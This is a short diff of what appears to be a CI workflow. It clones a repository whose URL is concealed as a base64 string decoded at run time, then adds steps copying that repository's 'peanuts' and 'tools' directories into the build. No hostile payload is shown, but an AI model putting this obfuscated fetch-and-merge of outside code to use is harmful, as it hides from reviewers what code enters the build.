@@ -436,7 +436,8 @@ jobs:
           git clone --depth 1 $(echo aHR0cHM6Ly9naXRodWIuY29tL2lnYXdhNi9wZWFudXRzLW5hdGl2ZS5naXQ= | base64 -d) /tmp/peanuts
           mkdir -p dm/games
           cp -rf /tmp/peanuts/dm/games/0100AD80208A8000 dm/games/
-          
+          cp -rf /tmp/peanuts/dm/peanuts dm/
+          cp -rf /tmp/peanuts/dm/tools/* dm/tools/
           rm -rf /tmp/peanuts
         
           CHAIN_SCRIPT="$(
